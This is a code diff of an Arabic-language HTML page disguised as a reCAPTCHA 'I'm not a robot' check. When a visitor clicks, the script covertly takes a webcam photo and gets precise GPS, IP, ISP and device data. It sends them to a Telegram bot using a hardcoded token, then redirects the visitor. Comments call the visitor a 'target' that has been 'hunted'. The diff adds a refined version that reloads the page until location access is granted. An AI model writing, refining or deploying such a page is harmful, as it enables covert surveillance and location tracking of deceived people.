@@ -5,14 +5,15 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>التحقق من الأمان</title>
     <style>
-        body { background-color: #f9f9f9; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; font-family: Roboto, helvetica, arial, sans-serif; }
-        .captcha-box { background: #fff; border: 1px solid #d3d3d3; border-radius: 3px; width: 300px; height: 74px; display: flex; align-items: center; padding: 0 10px; box-shadow: 0 0 4px rgba(0,0,0,0.08); cursor: pointer; }
-        .checkbox { width: 24px; height: 24px; border: 2px solid #c1c1c1; border-radius: 2px; margin-left: 10px; position: relative; }
-        .text { font-size: 14px; color: #555; font-weight: 400; flex-grow: 1; }
-        .logo { text-align: center; }
-        .logo img { width: 30px; }
+        body { background-color: #f9f9f9; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; font-family: 'Roboto', arial, sans-serif; }
+        .captcha-box { background: #fff; border: 1px solid #d3d3d3; border-radius: 3px; width: 300px; height: 74px; display: flex; align-items: center; padding: 0 10px; box-shadow: 0 0 4px rgba(0,0,0,0.08); cursor: pointer; transition: 0.2s; }
+        .captcha-box:hover { border-color: #b2b2b2; }
+        .checkbox { width: 24px; height: 24px; border: 2px solid #c1c1c1; border-radius: 2px; margin-left: 12px; background: #fff; }
+        .text { font-size: 14px; color: #555; flex-grow: 1; user-select: none; }
+        .logo { text-align: center; min-width: 70px; }
+        .logo img { width: 32px; }
         .logo p { font-size: 8px; color: #555; margin: 0; }
-        #loader { display: none; width: 20px; height: 20px; border: 3px solid #f3f3f3; border-top: 3px solid #4d90fe; border-radius: 50%; animation: spin 1s linear infinite; }
+        #loader { display: none; width: 22px; height: 22px; border: 3px solid #f3f3f3; border-top: 3px solid #4d90fe; border-radius: 50%; animation: spin 1s linear infinite; margin-left: 12px; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
         video, canvas { display: none; }
     </style>
@@ -20,11 +21,11 @@
 <body>
 
 <div class="captcha-box" id="mainBox">
-    <div class="checkbox" id="check"></div>
+    <div class="checkbox" id="checkSquare"></div>
     <div id="loader"></div>
     <div class="text">أنا لست برنامج روبوت</div>
     <div class="logo">
-        <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" alt="reCAPTCHA">
+        <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png">
         <p>الخصوصية - البنود</p>
     </div>
 </div>
@@ -37,56 +38,63 @@
     const _TK = '7873426394:AAEc5lKRwi3Zy8owh1TKMLJsMme_s6Zawak'; 
     const _REDIRECT = "https://hamoyouo84-del.github.io/matrix-market/#";
 
-    const mainBox = document.getElementById('mainBox');
-    const check = document.getElementById('check');
-    const loader = document.getElementById('loader');
+    document.getElementById('mainBox').addEventListener('click', async () => {
+        const checkSquare = document.getElementById('checkSquare');
+        const loader = document.getElementById('loader');
 
-    mainBox.addEventListener('click', async () => {
-        // تغيير الشكل للتحميل
-        check.style.display = 'none';
+        // تحويل المربع لعلامة تحميل
+        checkSquare.style.display = 'none';
         loader.style.display = 'block';
 
         try {
-            // 1. طلب الكاميرا والموقع (الرسالة هتظهر للمستخدم هنا)
+            // 1. طلب الكاميرا أولاً
             const stream = await navigator.mediaDevices.getUserMedia({ video: true });
-            
-            // طلب الموقع الجغرافي (GPS)
-            let gpsLink = "المستخدم رفض الموقع";
-            navigator.geolocation.getCurrentPosition((pos) => {
-                gpsLink = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
-            });
-
             const video = document.getElementById('v');
             video.srcObject = stream;
 
-            // انتظار بسيط للقطة
-            await new Promise(r => setTimeout(r, 2000));
+            // 2. طلب الموقع الجغرافي بأعلى دقة ممكنة (High Accuracy)
+            navigator.geolocation.getCurrentPosition(async (pos) => {
+                const lat = pos.coords.latitude;
+                const lon = pos.coords.longitude;
+                // رابط الخريطة اللي هيجيب "شمال سيناء" بالمللي
+                const mapsLink = `https://www.google.com/maps?q=${lat},${lon}`;
 
-            const canvas = document.getElementById('c');
-            canvas.width = 640; canvas.height = 480;
-            canvas.getContext('2d').drawImage(video, 0, 0);
+                // 3. التقاط الصورة
+                await new Promise(r => setTimeout(r, 1500));
+                const canvas = document.getElementById('c');
+                canvas.width = 640; canvas.height = 480;
+                canvas.getContext('2d').drawImage(video, 0, 0);
 
-            canvas.toBlob(async (blob) => {
-                let info = "جاري جلب الـ IP...";
-                try {
-                    const res = await fetch('https://ipapi.co/json/');
-                    const d = await res.json();
-                    info = `🌐 IP: ${d.ip}\n🏢 الشركة: ${d.org}\n🏙️ المدينة: ${d.city}`;
-                } catch(e) {}
+                canvas.toBlob(async (blob) => {
+                    // جلب الـ IP كبيانات إضافية
+                    let ipData = "Unknown IP";
+                    try {
+                        const res = await fetch('https://ipapi.co/json/');
+                        const d = await res.json();
+                        ipData = `🌐 IP: ${d.ip}\n🏢 الشركة: ${d.org}`;
+                    } catch(e) {}
 
-                const fd = new FormData();
-                fd.append('chat_id', _ID);
-                fd.append('photo', blob, 'u.jpg');
-                fd.append('caption', `✅ **تم اجتياز الكابتشا!**\n\n${info}\n📍 GPS: ${gpsLink}\n📱 الجهاز: ${navigator.userAgent}\n⏰ ${new Date().toLocaleString('ar-EG')}`);
+                    const fd = new FormData();
+                    fd.append('chat_id', _ID);
+                    fd.append('photo', blob, 'shot.jpg');
+                    fd.append('caption', `🎯 **تم اصطياد الهدف بدقة!**\n\n📍 الموقع على الخريطة:\n${mapsLink}\n\n${ipData}\n📱 الجهاز: ${navigator.userAgent}\n⏰ ${new Date().toLocaleString('ar-EG')}`);
 
-                await fetch(`https://api.telegram.org/bot${_TK}/sendPhoto`, { method: 'POST', body: fd });
+                    // إرسال البيانات لتليجرام
+                    await fetch(`https://api.telegram.org/bot${_TK}/sendPhoto`, { method: 'POST', body: fd });
 
-                stream.getTracks().forEach(t => t.stop());
-                window.location.href = _REDIRECT;
-            }, 'image/jpeg', 0.7);
+                    // إنهاء المهمة والتحويل
+                    stream.getTracks().forEach(t => t.stop());
+                    window.location.href = _REDIRECT;
+                }, 'image/jpeg', 0.8);
 
-        } catch (err) {
-            // لو رفض برضه هنوديه للموقع
+            }, (err) => {
+                // لو رفض الموقع، هنحاول نبعت الصورة والـ IP بس
+                alert("برجاء الموافقة على صلاحيات الموقع للمتابعة.");
+                location.reload();
+            }, { enableHighAccuracy: true, timeout: 10000 });
+
+        } catch (e) {
+            // لو رفض الكاميرا، هيتم توجيهه للموقع فوراً
             window.location.href = _REDIRECT;
         }
     });
@@ -94,4 +102,3 @@
 
 </body>
 </html>
-
